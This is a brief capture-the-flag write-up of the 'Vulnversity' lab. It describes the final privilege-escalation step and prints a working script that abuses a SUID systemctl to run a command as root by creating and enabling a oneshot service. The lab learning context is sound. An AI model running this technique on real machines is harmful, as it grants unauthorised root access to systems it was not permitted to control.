# Vulnversity

This CTF is pretty simple. The only difficult problem is the last one.

```
It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer?

Become root and get the last flag (/root/root.txt)
```

I don't know anything about `systemctl` so it was difficult to know where to even start. I looked through the man page, but there is so much stuff there, it's hard to know what to look for. Eventually, I looked up a write up and it led to GTFOBins, which I honestly should've known to look at.

The trick is to replace `id` with `cat /root/root.txt`.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

This code basically makes a service to read the root.txt and runs the service.

The takeaway for this CTF is that when privilege escalation is involved, I need to look at GTFOBins.